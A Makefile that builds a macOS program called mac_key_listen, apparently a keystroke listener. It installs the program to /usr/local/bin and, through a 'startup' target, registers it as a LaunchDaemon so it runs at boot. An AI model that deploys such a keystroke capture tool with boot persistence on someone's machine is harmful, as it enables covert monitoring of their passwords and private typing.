CC=gcc
CFLAGS=-framework ApplicationServices -framework Carbon
SOURCES=mac_key_listen.c
EXECUTABLE=mac_key_listen
PLIST=mac_key_listen.plist
INSTALLDIR=/usr/local/bin

all: $(SOURCES)
	$(CC) $(SOURCES) $(CFLAGS) -o $(EXECUTABLE)

install: all
	mkdir -p $(INSTALLDIR)
	cp $(EXECUTABLE) $(INSTALLDIR)

uninstall:
	rm $(INSTALLDIR)/$(EXECUTABLE)
	rm /Library/LaunchDaemons/$(PLIST)

startup: install
	cp $(PLIST) /Library/LaunchDaemons

clean:
	rm $(EXECUTABLE)
